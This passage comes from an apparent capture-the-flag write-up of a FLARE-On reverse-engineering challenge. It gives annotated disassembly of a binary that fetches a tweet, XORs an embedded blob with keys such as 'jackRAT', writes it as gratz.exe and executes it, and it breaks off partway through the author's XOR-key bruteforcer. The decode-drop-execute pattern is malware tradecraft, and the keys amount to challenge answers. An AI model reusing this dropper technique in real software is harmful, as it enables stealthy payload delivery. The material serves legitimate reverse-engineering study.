26
27
28
29
30
31
32
33
34
35</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">D6</span> <span style="color: #268BD2">loc_4019D6</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">D6</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">dwNumberOfBytesRead</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">DC</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>             <span style="color: #586E75">; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">DD</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">1000h</span>           <span style="color: #586E75">; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">E2</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">Buffer</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">E8</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>             <span style="color: #586E75">; lpBuffer - Buffer to hold the retrieved data</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">E9</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; hFile - Handle from previous InternetOpenUrl call</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">EA</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">InternetReadFile</span> <span style="color: #586E75">; Reading the first 4KBs of the tweet</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">F0</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">dwNumberOfBytesRead</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">F6</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">edi</span><span style="color: #719e07">+</span><span style="color: #B58900">edx</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">F9</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; size_t</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">FA</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">??2@YAPAXI@Z</span>    <span style="color: #586E75">; operator new(uint)</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">FF</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edi</span>             <span style="color: #586E75">; size_t</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A00</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A02</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; void *</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A03</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">esi</span>             <span style="color: #586E75">; void *</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A04</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_memcpy</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A09</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">dwNumberOfBytesRead</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A0F</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>             <span style="color: #586E75">; size_t</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A10</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">Buffer</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A16</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>             <span style="color: #586E75">; void *</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A17</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #B58900">edi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A1A</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; void *</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A1B</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_memcpy</span>         <span style="color: #586E75">; Copy retrieved data to [eax]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A20</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; void *</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A21</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">??3@YAXPAX@Z</span>    <span style="color: #586E75">; operator delete(void *)</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A26</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">dwNumberOfBytesRead</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A2C</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">20h</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A2F</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">edi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A31</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ebx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">esi</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A33</span> <span style="color: #268BD2">test</span>    <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>         <span style="color: #586E75">; Keep reading until NumberofBytesRead is zero</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">A35</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_4019D0</span> <span style="color: #586E75">; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading</span>

<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">D0</span> <span style="color: #268BD2">loc_4019D0</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">D0</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">hInternet</span><span style="color: #93A1A1">]</span> <span style="color: #586E75">; Back to the top to continue reading</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx" target="_blank">InternetReadFile</a> retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says &ldquo;[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero.&rdquo; This is happening in lines 31-35. We keep reading until <code>NumberofBytesRead</code> is zero.</p>

<p>After we are done, the jump in line 32 is not taken and we land here:</p>

<p><img src="/images/2014/flare/7-21.jpg" alt="Sifting through the tweet" title="Sifting through the tweet" /></p>

<p>We retrieved the tweet. Now <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx" target="_blank">strstr</a> is called to find the first instance of <code>Secluded Hi</code> in the tweet. The return value is a pointer to the start of <code>Secluded HijackRAT http://t.co/ckx18JHdkb ...</code>. The application adds <code>0x0B</code> or 11 to the start of the string to skip <code>Secluded Hi</code> and point to <code>jackRAT http://t.co/ckx18JHdkb ...</code>. A new 8 character buffer is created and passed to <a href="http://msdn.microsoft.com/en-us/library/xdsywd25.aspx" target="_blank">strncpy</a>. <code>strncpy</code> is called to copy 7 bytes from the start to the newly created buffer which will be <code>jackRAT</code>. The rest is simple, <code>jackRAT</code> is xor-ed with the blob and finally <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx" target="_blank">InternetCloseHandle</a> is called three times to close the three function calls.</p>

<p><img src="/images/2014/flare/7-22.jpg" alt="xor(blob,&quot;jackRAT&quot;)" title="xor(blob,&quot;jackRAT" /></p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>jackRAT xor</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;jackRAT&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="are-we-there-yet-gratz-but-not-yet:94bf06dd1bee42f6b34a1ff79274f7e7">Are we there yet? gratz but not yet</h3>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">loc_401B83</span><span style="color: #93A1A1">:</span>                             <span style="color: #586E75">; CODE XREF: .text:00401B58j</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">InternetRootz</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B88</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">jackRAT</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B8D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span>          <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B90</span> <span style="color: #268BD2">movzx</span>   <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ecx</span><span style="color: #93A1A1">]</span>   <span style="color: #586E75">; application crashes here if no arguments are provided</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B93</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">dl</span>              <span style="color: #586E75">; blob[0] = arg1[0]; first character of arg1 written to blob</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B99</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B9C</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">cl</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">eax</span><span style="color: #719e07">+</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span>           <span style="color: #586E75">; cl = arg1[1]; second character of arg1</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B9F</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">byte</span><span style="color: #268BD2">_4131F9</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">cl</span>       <span style="color: #586E75">; blob[1] = arg1[1];</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BA5</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">]</span>          <span style="color: #586E75">; edx = *(arg2);</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BA8</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">al</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">edx</span><span style="color: #93A1A1">]</span>             <span style="color: #586E75">; al = arg2[0];</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BAA</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">byte</span><span style="color: #268BD2">_413278</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">al</span>       <span style="color: #586E75">; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BAF</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">]</span>          <span style="color: #586E75">; ecx = *(arg2);</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BB2</span> <span style="color: #268BD2">movzx</span>   <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ecx</span><span style="color: #719e07">+</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span> <span style="color: #586E75">; edx = arg2[1];</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BB6</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">-</span><span style="color: #2AA198">10h</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BB9</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aWb</span>            <span style="color: #586E75">; mode: &quot;wb&quot; - write in binary mode</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BBE</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>                   <span style="color: #586E75">; push current path</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BBF</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">byte</span><span style="color: #268BD2">_413279</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">dl</span>       <span style="color: #586E75">; blob[0x81] = arg2[1];</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BC5</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">dword</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">-</span><span style="color: #2AA198">10h</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">74617267h</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BCC</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">dword</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">-</span><span style="color: #2AA198">0Ch</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">78652E7Ah</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BD3</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">word</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">-</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">65h</span> <span style="color: #586E75">; &quot;gratz.exe&quot; saved in [ebp-10]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BD9</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_fopen</span>                <span style="color: #586E75">; fopen(filename=&quot;currentpath\gratz.exe&quot;,mode=&quot;wb&quot;); Open if exists and if not create it</span>

<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BDE</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">bl</span><span style="color: #268BD2">ob_length</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BE4</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>              <span style="color: #586E75">; *(gratz.exe)</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BE6</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">esi</span>                   <span style="color: #586E75">; FILE = *(gratz.exe)</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BE7</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>                   <span style="color: #586E75">; size = blob length</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BE8</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">1</span>                     <span style="color: #586E75">; count = 1</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BEA</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span>           <span style="color: #586E75">; buffer = *(blob)</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BEF</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_fwrite</span>               <span style="color: #586E75">; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe</span>

<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BF4</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">esi</span>                   <span style="color: #586E75">; push *(gratz.exe)</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BF5</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_fclose</span>               <span style="color: #586E75">; fclose( *(gratz.exe) ); Close gratz.exe</span>

<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BFA</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">-</span><span style="color: #2AA198">10h</span><span style="color: #93A1A1">]</span>        <span style="color: #586E75">; edx = &quot;gratz.exe&quot;</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BFD</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">BFE</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_system</span>               <span style="color: #586E75">; system(&quot;gratz.exe&quot;); Execute gratz.exe</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">C03</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">-</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application&rsquo;s complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset <code>0x80</code> and <code>0x81</code>.</p>

<p>Then <a href="http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx" target="_blank">fopen</a> is called to create/open a file named <code>gratz.exe</code> for writing in binary mode (&ldquo;wb&rdquo;). Then blob is written to it by calling <a href="http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx" target="_blank">fwrite</a> and finally it is closed with <a href="http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx" target="_blank">fclose</a>. Then command <code>gratz.exe</code> is run via the <a href="http://msdn.microsoft.com/en-us/library/277bwbdz.aspx" target="_blank">system</a> call. So we are writing the blob to a file and then executing it.</p>

<p>What is special about first two bytes in a Windows binary? It&rsquo;s the start of the DOS stub with the magic bytes <code>MZ</code> and you have already guessed that the second argument should be <code>PE</code>.</p>

<h3 id="how-do-i-xor:94bf06dd1bee42f6b34a1ff79274f7e7">How do I XOR?</h3>

<p>But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to <code>00401B8D</code> and step through after the breakpoint. Stop before the <code>system</code> call and copy the <code>gratz.exe</code> file from disk.</p>

<p>Here&rsquo;s my bruteforcer. This is not good code but at that point I just wanted to finish.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>bruteforcer</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">key1</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key1[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;oh happy dayz&#39;</span>
<span style="color: #93A1A1">key1[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;the final countdown&#39;</span>
 
<span style="color: #93A1A1">key2</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key2[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;UNACCEPTABLE!&#39;</span>
<span style="color: #93A1A1">key2[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;omglob&#39;</span>
 
<span style="color: #93A1A1">key3</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key3[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;you</span><span style="color: #CB4B16">\x27</span><span style="color: #2AA198">re so good&#39;</span>
<span style="color: #93A1A1">key3[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;you</span><span style="color: #CB4B16">\x27</span><span style="color: #2AA198">re so bad&#39;</span>
 
<span style="color: #93A1A1">key4</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key4[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x66</span><span style="color: #2AA198">&#39;</span>
<span style="color: #93A1A1">key4[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x01</span><span style="color: #2AA198">&#39;</span>
 
<span style="color: #93A1A1">key5</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key5[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;Sandboxes are fun to play in&#39;</span>
<span style="color: #93A1A1">key5[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;I</span><span style="color: #CB4B16">\x27</span><span style="color: #2AA198">m gonna sandbox your face&#39;</span>
 
<span style="color: #93A1A1">key6</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key6[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;I can haz decode?&#39;</span>
<span style="color: #93A1A1">key6[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;Such fire. Much burn. Wow.&#39;</span>
 
<span style="color: #93A1A1">key7</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key7[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;</span><span style="color: #CB4B16">\x09\x00\x00\x01</span><span style="color: #2AA198">&#39;</span>
<span style="color: #93A1A1">key7[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;Feel the sting of the Monarch!&#39;</span>
 
<span style="color: #93A1A1">key8</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key8[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;! 50 1337&#39;</span>
<span style="color: #93A1A1">key8[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;1337&#39;</span>
 
<span style="color: #93A1A1">key9</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key9[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;LETS GO SHOPPING&#39;</span>
<span style="color: #93A1A1">key9[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;MATH IS HARD&#39;</span>
 
<span style="color: #93A1A1">key10</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
<span style="color: #93A1A1">key10[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;LETS GO MATH&#39;</span>
<span style="color: #93A1A1">key10[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span><span style="color: #719e07">=</span><span style="color: #2AA198">&#39;SHOPPING IS HARD&#39;</span>
 
<span style="color: #93A1A1">key11</span><span style="color: #719e07">=</span><span style="color: #93A1A1">{}</span>
